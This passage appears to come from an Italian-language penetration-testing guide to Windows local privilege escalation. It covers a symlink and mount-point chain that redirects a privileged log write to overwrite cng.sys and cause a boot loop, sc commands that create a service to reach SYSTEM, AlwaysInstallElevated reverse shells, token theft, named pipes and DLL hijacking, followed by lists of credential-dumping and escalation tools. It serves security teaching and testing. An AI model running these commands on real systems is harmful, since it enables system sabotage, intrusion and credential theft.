- Possibilità di creare un mount point verso `\RPC Control` e un symlink OM a un file (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Un’operazione privilegiata che scriva in quel percorso (log, esportazione, report).

**Esempio di catena**
1. Leggi la configurazione per recuperare la destinazione del log privilegiato, ad es. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Reindirizza il percorso senza privilegi admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Attendi che il componente privilegiato scriva il log (ad es., un amministratore seleziona «invia SMS di prova»). La scrittura finisce ora in `C:\Windows\System32\cng.sys`.
4. Esamina il target sovrascritto (parser hex/PE) per confermare la corruzione; il riavvio forza Windows a caricare il percorso del driver manomesso → **DoS con boot loop**. Questo si applica anche a qualsiasi file protetto che un servizio privilegiato apra in scrittura.

> `cng.sys` viene normalmente caricato da `C:\Windows\System32\drivers\cng.sys`, ma se esiste una copia in `C:\Windows\System32\cng.sys`, questa può essere tentata per prima, rendendola un bersaglio affidabile per causare un DoS con dati corrotti.



## **Da High Integrity a SYSTEM**

### **Nuovo servizio**

Se stai già eseguendo un processo High Integrity, il **percorso verso SYSTEM** può essere semplice: basta **creare ed eseguire un nuovo servizio**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Quando crei un service binary, assicurati che sia un servizio valido o che il binary esegua rapidamente le azioni necessarie, altrimenti verrà terminato dopo 20 secondi se non è un servizio valido.

### AlwaysInstallElevated

Da un processo High Integrity puoi provare ad **abilitare le voci di registro AlwaysInstallElevated** e **installare** una reverse shell usando un wrapper _**.msi**_.\
[Altre informazioni sulle chiavi di registro coinvolte e su come installare un pacchetto _.msi_ qui.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Puoi** [**trovare il codice qui**](seimpersonate-from-high-to-system.md)**.**

### Da SeDebug + SeImpersonate a privilegi Full Token

Se disponi di questi token privileges (probabilmente li troverai in un processo già High Integrity), potrai **aprire quasi tutti i processi** (esclusi i processi protetti) con il privilegio SeDebug, **copiare il token** del processo e creare un **processo arbitrario con quel token**.\
Con questa tecnica di solito si **seleziona qualsiasi processo in esecuzione come SYSTEM con tutti i token privileges** (_sì, puoi trovare processi SYSTEM senza tutti i token privileges_).\
**Puoi trovare un** [**esempio di codice che esegue la tecnica proposta qui**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Questa tecnica viene usata da meterpreter per elevare i privilegi in `getsystem`. Consiste nel **creare una pipe e poi creare/abusare di un servizio per scriverci sopra**. Il **server** che ha creato la pipe usando il privilegio **`SeImpersonate`** potrà quindi **impersonare il token** del client della pipe (il servizio), ottenendo i privilegi SYSTEM.\
Se vuoi [**saperne di più sulle name pipe, leggi questo**](#named-pipe-client-impersonation).\
Se vuoi leggere un esempio di [**come passare da High Integrity a System usando le name pipe, leggi questo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Se riesci a **dirottare una dll** che viene **caricata** da un **processo** in esecuzione come **SYSTEM**, potrai eseguire codice arbitrario con quei permessi. Dll Hijacking è quindi utile anche per questo tipo di privilege escalation e, inoltre, è **molto più facile da ottenere da un processo High Integrity**, poiché avrà **permessi di scrittura** sulle cartelle usate per caricare le dll.\
**Puoi** [**saperne di più sul Dll hijacking qui**](dll-hijacking/index.html)**.**

### **Da Administrator o Network Service a System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Da LOCAL SERVICE o NETWORK SERVICE ai privilegi completi

**Leggi:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Ulteriore aiuto

[Binary statici di impacket](https://github.com/ropnop/impacket_static_binaries)

## Strumenti utili

**Miglior strumento per cercare vettori di privilege escalation locale di Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Verifica configurazioni errate e file sensibili (**[**controlla qui**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Rilevato.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Verifica alcune possibili configurazioni errate e raccoglie informazioni (**[**controlla qui**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Verifica le configurazioni errate**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Estrae le informazioni delle sessioni salvate di PuTTY, WinSCP, SuperPuTTY, FileZilla e RDP. Usa -Thorough in locale.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Estrae le credenziali da Credential Manager. Rilevato.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Esegue lo spray delle password raccolte nel dominio**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh è uno strumento PowerShell di spoofing ADIDNS/LLMNR/mDNS e man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Enumerazione di base di Windows per la privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Cerca vulnerabilità note di privesc (DEPRECATED a favore di Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Controlli locali **(Richiede diritti di Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Cerca vulnerabilità note di privesc (deve essere compilato con VisualStudio) ([**precompilato**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera l'host cercando configurazioni errate (è più uno strumento per raccogliere informazioni che per la privesc) (deve essere compilato) **(**[**precompilato**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Estrae le credenziali da molti software (exe precompilato su github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port di PowerUp in C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Verifica le configurazioni errate (eseguibile precompilato su github). Non consigliato. Non funziona bene su Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Verifica possibili configurazioni errate (exe da python). Non consigliato. Non funziona bene su Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Strumento creato sulla base di questo post (non richiede accesschk per funzionare correttamente, ma può usarlo).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Legge l'output di **systeminfo** e suggerisce exploit funzionanti (python locale)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Legge l'output di **systeminfo** e suggerisce exploit funzionanti (Python locale)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Devi compilare il progetto usando la versione corretta di .NET ([vedi qui](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Per vedere la versione di .NET installata sull'host vittima, puoi eseguire:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Fondamenti dell'escalation dei privilegi in Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Elevare i privilegi sfruttando autorizzazioni deboli sulle cartelle](http://www.greyhathacker.net/?p=738)
- [3] [Escalation dei privilegi in Windows - un cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Workshop sull'escalation locale dei privilegi in Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Attacchi Windows: AT è il nuovo black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Escalation dei privilegi - Windows - Guida OSCP completa](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Escalation dei privilegi - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Guida all'escalation dei privilegi in Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Checklist per l'escalation dei privilegi in Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Escalation dei privilegi in Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metodi di escalation dei privilegi in Windows per pentester](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing tramite macro VBA di Word via SMTP → decrittazione delle credenziali di hMailServer → CVE-2023-27532 di Veeam per ottenere SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak tramite format string + BOF sullo stack → ROP con VirtualAlloc (RCE) e furto del token kernel](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Alle calcagna della Silver Fox: gatto e topo tra le ombre del kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Vulnerabilità nel file system con privilegi elevati presente in un sistema SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Strumenti di test per i collegamenti simbolici – utilizzo di CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Ritorno al passato. Sfruttare i collegamenti simbolici in Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [BOF di RegPwn (porting Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: risoluzione pericolosa dei moduli in Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Moduli Node.js: caricamento dalle cartelle `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Sfide della checklist C/C++, risolte](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Funzione RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own con Microslop: concatenare CLDFLT e le race condition del kernel DirectX per l'escalation locale dei privilegi in Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Un solo I/O Ring per dominarli tutti: una primitiva di exploit completa di lettura/scrittura su Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Sfruttare le eliminazioni arbitrarie di file per elevare i privilegi e altri ottimi trucchi](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Codice exploit FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Attacchi WSUS Parte 2: CVE-2020-1013, escalation locale dei privilegi di Windows 10 a un giorno dalla divulgazione](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: esplorare Credential Manager e Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - PoC di CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Delega vincolata basata sulle risorse Kerberos: quando una modifica dell'immagine porta a un'escalation dei privilegi](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Estrazione delle chiavi private SSH dall'agent SSH di Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Trasformare i server di aggiornamento aziendali in fabbriche di backdoor (0_o) – Parte 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Trasformare i server di aggiornamento aziendali in fabbriche di backdoor (0_o) – Parte 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Escalation dei privilegi tramite eliminazione della cartella di Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
{{#include ../../banners/hacktricks-training.md}}
